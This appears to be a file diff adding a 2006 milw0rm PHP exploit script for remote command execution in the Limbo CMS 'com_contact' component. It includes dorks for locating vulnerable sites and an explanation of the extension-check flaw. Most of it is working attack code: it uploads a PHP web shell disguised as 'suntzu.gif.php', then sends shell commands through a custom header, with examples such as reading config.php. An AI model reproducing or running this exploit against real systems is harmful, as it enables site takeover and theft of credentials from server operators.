@@ -1,0 +1,219 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+-----------------------------------------------------------------------------
+Limbo <= 1.0.4.2L "com_contact" remote commands execution exploit
+by rgod rgod@autistici.org
+site: http://retrogod.altervista.org
+dorks: inurl:contact inurl:Itemid inurl:option attachment "Enter your name:"
+       intext:"site powered by limbo"
+-----------------------------------------------------------------------------
+');
+if ($argc<3) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path itemid cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to Limbo
+itemid:    a number, check [*] or [**]
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /limbo/ 43 ls -la -P1.1.1.1:80
+php '.$argv[0].' 1.1.1.1 / 3 cat ./../../config.php -p81
+-----------------------------------------------------------------------------
+');
+die;
+}
+/*
+explaination:
+there are some upload scripts in default installation, check:
+
+[*]  http://target/path_to_limbo/index.php?Itemid=43&option=contact
+[**] http://target/path_to_limbo/index.php?Itemid=3&option=contact
+
+and there is a vulnerable function in /components/com_contact/contact.html.php near lines 69-73:
+
+...
+function file_ext($file)
+{
+  $ext = explode(".", $file);
+  return strtolower($ext[1]); //[!!!!!!] <-------------------------------------------
+}
+...
+
+now look at /components/com_contact/contact.php
+...
+switch ( $task )
+{
+case "post":
+        {
+        $abs_dir = $lm_absolute_path."images/contact/";
+        $web_dir = $lm_website."images/contact/";
+        if (!is_dir($abs_dir)) mkdir($abs_dir);
+        $valid_ext = array(
+                "jpg",
+                "png",
+                "gif",
+                "doc",
+                "xls"
+                );
+
+        if ($_FILES['contact_attach']['name']!="")
+        {
+            $tmp_name = $_FILES['contact_attach']['tmp_name'];
+            $name = $_FILES['contact_attach']['name'];
+            $ext = file_ext($name); // [!] <-----------------------------------
+            if(!in_array($ext,$valid_ext)) // [!!] <-----------------------------------
+                { ?>
+                    <script language="JavaScript" type="text/javascript">
+                     alert("<?php echo _MESSAGE_ATTACH_INVALID; ?>");
+                     window.history.go(-1);
+                     </script>
+                     <?php
+                }else{
+             @move_uploaded_file($tmp_name, $abs_dir.$name); // [!!!!] <-----------------------------------
+             $contact_text.=" ("._MESSAGE_ATTACH.$web_dir.$name.")";
+             }
+        }
+...
+
+but what happen if the attachment filename is like suntzu.gif.php ?
+
+You can upload arbitrary php code, then u launch commands:
+
+http://[target]/[path]/images/contact/suntzu.gif.php?cmd=ls%20-la
+
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$itemid=$argv[3];
+$cmd="";
+$port=80;
+$proxy="";
+for ($i=4; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$data="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"contact_name\";\r\n\r\n";
+$data.="suntzu\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"contact_email\";\r\n\r\n";
+$data.="suntzu@suntzu.org\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"contact_subject\";\r\n\r\n";
+$data.="hereitissuntzu\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"contact_text\";\r\n\r\n";
+$data.="ohshit\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"task\";\r\n\r\n";
+$data.="post\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"send\";\r\n\r\n";
+$data.="Send\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"contact_attach\"; filename=\"suntzu.gif.php\";\r\n";
+$data.="Content-Type: image/gif;\r\n\r\n";
+$data.="<?php set_time_limit(0); echo 'my_delim';passthru(\$_SERVER['HTTP_SUNTZU']);die;?>\r\n";
+$data.="-----------------------------7d529a1d23092a--\r\n";
+$packet ="POST ".$p."index.php?option=contact&Itemid=$itemid HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Accept: text/plain\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+
+$packet ="GET ".$p."images/contact/suntzu.gif.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="SUNTZU: ".$cmd."\r\n";
+$packet.="Accept: text/plain\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"my_delim"))
+{
+echo "exploit succeeded ...\r\n";
+$temp=explode("my_delim",$html);
+die($temp[1]);
+}
+//if you are here...
+echo "exploit failed ...\r\n";
+?>
+
+# milw0rm.com [2006-09-15]
